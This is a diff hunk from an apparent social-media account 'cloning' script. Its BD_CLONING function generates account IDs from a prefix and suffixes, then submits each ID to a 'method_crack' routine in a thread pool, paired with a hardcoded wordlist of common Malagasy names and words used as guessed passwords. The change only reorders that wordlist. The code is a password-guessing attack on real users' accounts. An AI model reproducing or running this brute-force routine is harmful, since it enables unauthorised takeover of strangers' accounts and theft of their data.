@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'anjara','nekena','vadiko','safidy','koloina','mamako','malala','mahefa','tanjona','solofo','dadako','papako','fitiavako','finoana','namako','nilaina','fifalina','miangaly','nomena','hasina','fandresena','fitiavana','mahery','faniry','harena','finaritra','mandresy','fiderana','mendrika','tokiniaina','andria','rakoto','tahiry','valisoa','seheno','felana','rojotiana','solofo','diamondra','tsilavina','maminirina','fahendrena','fiderana','fandresena','nekena','fanantenana','nirina','nantenaina','tolotra','jesosy','faneva','milely','narovana','mamisoa','narindra','sarobidy','sarindra','malagasy','mamiko','lahatra','finoana','fiderana','lafatra','amboara','tantely','tolotra','fahendrena','malalako','randria','rakotomalala']
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'anjara','vadiko','safidy','saholy','koloina','mahery','fitiavana','seheno','valisoa','felana','mamako','malala','mahefa','hasina','nomena','tanjona','solofo','dadako','papako','fitiavako','finoana','randria','nekena','namako','nilaina','fifalina','miangaly','fandresena','faniry','harena','finaritra','mandresy','fiderana','mendrika','tokiniaina','andria','rakoto','tahiry','rojotiana','solofo','diamondra','tsilavina','maminirina','fahendrena','fiderana','fandresena','fanantenana','nirina','nantenaina','tolotra','jesosy','faneva','milely','narovana','mamisoa','narindra','sarobidy','sarindra','malagasy','mamiko','lahatra','finoana','fiderana','lafatra','amboara','tantely','tolotra','fahendrena','malalako','rakotomalala']
             Dipto.submit(method_crack,ids,passlist)
     linex() 
     print(' LE CLONING EST FINI ')
